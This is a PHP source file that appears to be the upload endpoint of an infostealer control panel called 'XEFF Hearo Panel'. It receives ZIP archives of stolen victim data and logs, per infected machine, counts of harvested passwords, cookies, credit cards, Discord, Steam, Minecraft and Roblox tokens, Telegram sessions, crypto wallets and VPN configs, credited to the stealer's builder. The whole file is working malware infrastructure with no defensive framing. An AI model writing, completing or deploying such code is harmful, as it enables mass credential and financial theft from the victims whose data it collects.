<?php
require_once '../includes/config.php';

// XEFF Hearo Panel — Log Receiver API

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die('Method Not Allowed');
}

// Retrieve builder user from POST data
$builderUser = $_POST['builder_user'] ?? 'unregistered';

$stmt = $db->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$builderUser]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$user) {
    // If not found, still accept but mark as unregistered/guest
    $user = ['username' => 'unregistered'];
}

// Ensure the incoming data is a valid ZIP file
if (!isset($_FILES['log_file']) || $_FILES['log_file']['error'] !== UPLOAD_ERR_OK) {
    http_response_code(400);
    die('Bad Request - No log file');
}

$fileInfo = pathinfo($_FILES['log_file']['name']);
if (strtolower($fileInfo['extension']) !== 'zip') {
    http_response_code(400);
    die('Bad Request - Invalid format');
}

$sessionHash = generateHash();
$uploadDir = XEFF_ROOT . '/logs/' . $sessionHash;
mkdir($uploadDir, 0755, true);

$zipPath = $uploadDir . '/log.zip';
if (!move_uploaded_file($_FILES['log_file']['tmp_name'], $zipPath)) {
    http_response_code(500);
    die('Internal Server Error');
}

// Parse meta info from request
$computerName = sanitize($_POST['computer_name'] ?? 'Unknown');
$username = sanitize($_POST['username'] ?? 'Unknown');
$ip = $_SERVER['REMOTE_ADDR'];
// Usually you'd use a geoip db to get the country, defaulting to XX
$country = 'XX'; 

$osVersion = sanitize($_POST['os_version'] ?? 'Windows Unknown');
$passwordsCount = (int)($_POST['passwords_count'] ?? 0);
$cookiesCount = (int)($_POST['cookies_count'] ?? 0);
$discordTokens = (int)($_POST['discord_tokens'] ?? 0);
$creditCards = (int)($_POST['credit_cards'] ?? 0);
$robloxCookies = (int)($_POST['roblox_cookies'] ?? 0);
$minecraftTokens = (int)($_POST['minecraft_tokens'] ?? 0);
$steamTokens = (int)($_POST['steam_tokens'] ?? 0);
$telegramSessions = (int)($_POST['telegram_sessions'] ?? 0);
$cryptoWallets = (int)($_POST['crypto_wallets'] ?? 0);
$vpnConfigs = (int)($_POST['vpn_configs'] ?? 0);
$autofills = (int)($_POST['autofills'] ?? 0);
$historyEntries = (int)($_POST['history_entries'] ?? 0);
$downloads = (int)($_POST['downloads'] ?? 0);
$webTokens = (int)($_POST['web_tokens'] ?? 0);

$db->prepare("INSERT INTO logs (
    session_hash, computer_name, username, ip, country, os_version,
    passwords_count, cookies_count, discord_tokens, credit_cards,
    roblox_cookies, minecraft_tokens, steam_tokens, telegram_sessions,
    crypto_wallets, vpn_configs, autofills, history_entries, downloads, web_tokens,
    builder_user, data_path
) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)")->execute([
    $sessionHash, $computerName, $username, $ip, $country, $osVersion,
    $passwordsCount, $cookiesCount, $discordTokens, $creditCards,
    $robloxCookies, $minecraftTokens, $steamTokens, $telegramSessions,
    $cryptoWallets, $vpnConfigs, $autofills, $historyEntries, $downloads, $webTokens,
    $user['username'], $zipPath
]);

echo json_encode(['status' => 'success', 'session' => $sessionHash]);
?>
